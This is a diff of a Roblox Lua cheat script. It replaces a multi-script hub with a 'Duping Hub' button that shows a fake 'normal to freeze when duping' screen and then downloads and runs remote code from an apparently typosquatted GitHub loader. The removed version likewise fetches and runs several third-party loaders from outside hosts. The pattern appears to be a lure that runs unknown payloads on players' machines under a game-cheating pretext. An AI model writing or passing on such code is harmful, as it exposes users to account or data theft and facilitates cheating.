@@ -1,142 +1,118 @@
-debugX = true
-
--- First create the initialization screen function
-local function showInitializationScreen()
+-- Create the freeze screen function
+local function createFreezeScreen()
     local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "InitializationDisplay"
+    screenGui.Name = "FreezeScreen"
     screenGui.IgnoreGuiInset = true
     screenGui.ResetOnSpawn = false
     screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     screenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
 
+    -- Create a semi-transparent background
+    local background = Instance.new("Frame")
+    background.Name = "Background"
+    background.Size = UDim2.new(1, 0, 1, 0)
+    background.Position = UDim2.new(0, 0, 0, 0)
+    background.BackgroundColor3 = Color3.new(0, 0, 0)
+    background.BackgroundTransparency = 0.7
+    background.Parent = screenGui
+
+    -- Create the warning text
     local textLabel = Instance.new("TextLabel")
-    textLabel.Name = "InitializationText"
-    textLabel.Size = UDim2.new(1, 0, 1, 0)
-    textLabel.Position = UDim2.new(0, 0, 0, 0)
-    textLabel.BackgroundColor3 = Color3.new(0, 0, 0)
-    textLabel.TextColor3 = Color3.new(0, 1, 0)
-    textLabel.Font = Enum.Font.Code
-    textLabel.TextSize = 36
-    textLabel.Text = "PLS WAIT Initializing Database..."
-    textLabel.TextScaled = false
+    textLabel.Name = "WarningText"
+    textLabel.Size = UDim2.new(0.8, 0, 0.2, 0)
+    textLabel.Position = UDim2.new(0.1, 0, 0.4, 0)
+    textLabel.BackgroundTransparency = 1
+    textLabel.TextColor3 = Color3.new(1, 0, 0)
+    textLabel.Font = Enum.Font.SourceSansBold
+    textLabel.TextSize = 24
+    textLabel.Text = "PLS WAIT - It's normal to freeze your game when duping"
     textLabel.TextWrapped = true
     textLabel.TextXAlignment = Enum.TextXAlignment.Center
     textLabel.TextYAlignment = Enum.TextYAlignment.Center
     textLabel.Parent = screenGui
 
-    -- Color cycling coroutine
+    -- Add a loading spinner
+    local spinner = Instance.new("ImageLabel")
+    spinner.Name = "Spinner"
+    spinner.Size = UDim2.new(0, 50, 0, 50)
+    spinner.Position = UDim2.new(0.5, -25, 0.6, 0)
+    spinner.BackgroundTransparency = 1
+    spinner.Image = "rbxassetid://5644704149" -- Default loading spinner image
+    spinner.Parent = screenGui
+
+    -- Animate the spinner
     coroutine.wrap(function()
-        local hue = 0
-        while true do
-            hue = (hue + 0.01) % 1
-            textLabel.TextColor3 = Color3.fromHSV(hue, 1, 1)
-            local dots = string.rep(".", math.floor((tick() % 3) + 1))
-            textLabel.Text = "PLS WAIT Initializing Database" .. dots
-            task.wait(0.1)
+        while spinner and spinner.Parent do
+            spinner.Rotation = spinner.Rotation + 5
+            task.wait()
         end
     end)()
-    
+
     return screenGui
 end
 
--- Show initialization screen while loading Rayfield
-local initScreen = showInitializationScreen()
+-- Create the main UI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "DupingUI"
+ScreenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
 
--- Load Rayfield with error handling
-local Rayfield, rayfieldError = pcall(function()
-    return loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 300, 0, 200)
+Frame.Position = UDim2.new(0.5, -150, 0.5, -100)
+Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Frame.BorderSizePixel = 0
+Frame.Parent = ScreenGui
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 8)
+UICorner.Parent = Frame
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.Position = UDim2.new(0, 0, 0, 0)
+Title.BackgroundTransparency = 1
+Title.Text = "7xxx Duping Hub"
+Title.TextColor3 = Color3.new(1, 1, 1)
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 20
+Title.Parent = Frame
+
+local Button = Instance.new("TextButton")
+Button.Size = UDim2.new(0.8, 0, 0, 40)
+Button.Position = UDim2.new(0.1, 0, 0.5, -20)
+Button.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+Button.Text = "Start Duping Process"
+Button.TextColor3 = Color3.new(1, 1, 1)
+Button.Font = Enum.Font.Gotham
+Button.TextSize = 16
+Button.Parent = Frame
+
+local UICorner2 = Instance.new("UICorner")
+UICorner2.CornerRadius = UDim.new(0, 8)
+UICorner2.Parent = Button
+
+-- Button click handler
+Button.MouseButton1Click:Connect(function()
+    -- Create freeze screen
+    local freezeScreen = createFreezeScreen()
+    
+    -- Execute after a small delay to ensure freeze screen shows
+    task.delay(0.5, function()
+        -- Execute the script
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-idd/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua", true))()
+        end)
+        
+        -- Remove freeze screen after 15 seconds regardless of success
+        task.delay(15, function()
+            if freezeScreen and freezeScreen.Parent then
+                freezeScreen:Destroy()
+            end
+            
+            if not success then
+                warn("Duping script failed to load:", err)
+                -- You could show an error message here if you want
+            end
+        end)
+    end)
 end)
-
-if not Rayfield or rayfieldError then
-    initScreen:Destroy()
-    warn("Failed to load Rayfield:", rayfieldError)
-    return
-end
-
--- Now create the window
-local Window = Rayfield:CreateWindow({
-   Name = "7xxx HUB",
-   LoadingTitle = "7xxx Interface Suite",
-   LoadingSubtitle = "by 7xxx Duping #GAG",
-   ConfigurationSaving = {
-      Enabled = false,
-   },
-   Discord = {
-      Enabled = true,
-      Invite = "2pKgPGNm",
-      RememberJoins = false
-   },
-   KeySystem = false,
-})
-
--- Remove initialization screen after Rayfield loads
-initScreen:Destroy()
-
--- Create tabs and buttons
-local Tab = Window:CreateTab("Script Tab", 4483362458)
-local Section = Tab:CreateSection("Keyless Script Selection")
-
-Tab:CreateButton({
-    Name = "No-Lag Script",
-    Callback = function()
-        local loadingScreen = showInitializationScreen()
-        local success, err = pcall(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/main/Loader/LoaderV1.lua", true))()
-        end)
-        task.wait(15.5)
-        loadingScreen:Destroy()
-        if not success then
-            warn("Failed to load No-Lag Script:", err)
-        end
-    end,
-})
-
-Tab:CreateButton({
-    Name = "Anti Stealer",
-    Callback = function()
-        local loadingScreen = showInitializationScreen()
-        local success, err = pcall(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-idd/No-Lag-HUB/main/Loader/LoaderV1.lua", true))()
-        end)
-        task.wait(15.5)
-        loadingScreen:Destroy()
-        if not success then
-            warn("Failed to load Anti Stealer:", err)
-        end
-    end,
-})
-
-local Tab1 = Window:CreateTab("Premium Scripts", 4483362458)
-local Section1 = Tab1:CreateSection("Key Script Selection")
-
-Tab1:CreateButton({
-    Name = "Lunor Script",
-    Callback = function()
-        local loadingScreen = showInitializationScreen()
-        local success, err = pcall(function()
-            loadstring(game:HttpGet("https://lunor.dev/loader", true))()
-        end)
-        task.wait(15.5)
-        loadingScreen:Destroy()
-        if not success then
-            warn("Failed to load Lunor Script:", err)
-        end
-    end,
-})
-
-Tab1:CreateButton({
-    Name = "Lumin Script",
-    Callback = function()
-        local loadingScreen = showInitializationScreen()
-        local success, err = pcall(function()
-            loadstring(game:HttpGet("https://lumin-hub.lol/loader.lua", true))()
-        end)
-        task.wait(15.5)
-        loadingScreen:Destroy()
-        if not success then
-            warn("Failed to load Lumin Script:", err)
-        end
-    end,
-})
-
-Rayfield:LoadConfiguration()
